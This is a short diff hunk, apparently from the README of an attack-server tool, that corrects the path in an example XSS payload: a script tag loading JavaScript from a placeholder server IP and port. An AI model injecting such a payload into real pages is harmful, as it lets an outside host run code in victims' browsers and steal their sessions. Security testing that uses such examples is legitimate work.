@@ -33,4 +33,4 @@ Start server (with redress:)
 
 XSS:
 
-* \<script src="http://\<serverip\>:\<serverport\>i"\>\</script\>
+* \<script src="http://\<serverip\>:\<serverport\>/i"\>\</script\>
